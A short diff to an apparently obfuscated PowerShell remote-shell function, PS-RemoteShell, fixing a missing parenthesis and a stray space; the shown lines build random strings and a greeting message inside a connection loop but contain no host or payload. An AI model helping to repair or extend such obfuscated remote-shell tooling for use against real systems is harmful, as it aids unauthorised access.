@@ -183,7 +183,7 @@ function PS-RemoteShell {
         
         While($VAR17 -ne $True) {
             $VAR26 = ""
-            $VAR22 = VAR51 -Length $(Get-Random -Minimum 5 -Maximum 16
+            $VAR22 = VAR51 -Length $(Get-Random -Minimum 5 -Maximum 16)
 			
             if ($Protocol -eq "https") {
                 $VAR20 = @"
@@ -235,7 +235,7 @@ function PS-RemoteShell {
                 $VAR26 = "hello $($VAR29)"
             }
             
-            $VAR26  = $VAR26 + "`n"
+            $VAR26 = $VAR26 + "`n"
             $VAR21 = $VAR26 + $VAR27
         }
     }
